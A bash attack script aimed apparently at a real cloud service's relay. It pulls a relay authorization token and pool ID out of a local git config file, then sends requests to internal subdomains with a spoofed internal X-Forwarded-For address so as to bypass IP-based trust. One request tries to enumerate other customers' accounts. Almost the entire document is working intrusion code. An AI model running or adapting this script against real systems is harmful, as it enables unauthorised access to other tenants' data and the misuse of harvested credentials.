#!/bin/bash
JWT=$(grep -oP '(?<=x-relay-authorization:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
STOKEN="$SCALR_TOKEN"
echo "[agent_ip] $(hostname -I)"

relay_get() {
  local label=$1 url=$2; shift 2
  CODE=$(curl -sS -o /tmp/rout.bin -w "%{http_code}" --max-time 8 -L "$@" \
    -H "x-relay-authorization: $JWT" -H "X-Relay-Agent-Pool-ID: $POOL" \
    "https://relay.main.scalr.dev/$url" 2>/tmp/rerr.txt)
  BODY=$(python3 -c "
import sys,gzip,json
d=open('/tmp/rout.bin','rb').read()
try: d=gzip.decompress(d)
except: pass
try: d=json.loads(d.decode('utf-8','replace')); print(json.dumps(d)[:500])
except: print(d.decode('utf-8','replace')[:400])" 2>/dev/null)
  echo "[relay] $label → HTTP $CODE"
  echo "  $BODY"
}

# Account-specific subdomain + XFF spoof of internal IP
# vlad2910.internal.main.scalr.dev should route to vlad2910 account
relay_get "account-subdomain-with-xff" \
  "https://vlad2910.internal.main.scalr.dev/api/iacp/v3/workspaces?filter%5Baccount%5D=acc-v0p14gmusfk03k3e0&page%5Bsize%5D=3" \
  -H "Authorization: Bearer $STOKEN" \
  -H "X-Forwarded-For: 10.30.0.5" \
  -H "Accept: application/vnd.api+json"

# Try without XFF spoof to compare
relay_get "account-subdomain-no-xff" \
  "https://vlad2910.internal.main.scalr.dev/api/iacp/v3/workspaces?filter%5Baccount%5D=acc-v0p14gmusfk03k3e0&page%5Bsize%5D=3" \
  -H "Authorization: Bearer $STOKEN" \
  -H "Accept: application/vnd.api+json"

# Also try to access another account's data (account enum)
relay_get "all-accounts-internal" \
  "https://internal.main.scalr.dev/api/iacp/v3/accounts" \
  -H "Authorization: Bearer $STOKEN" \
  -H "X-Forwarded-For: 10.30.0.5" \
  -H "Accept: application/vnd.api+json"

echo "[done]"
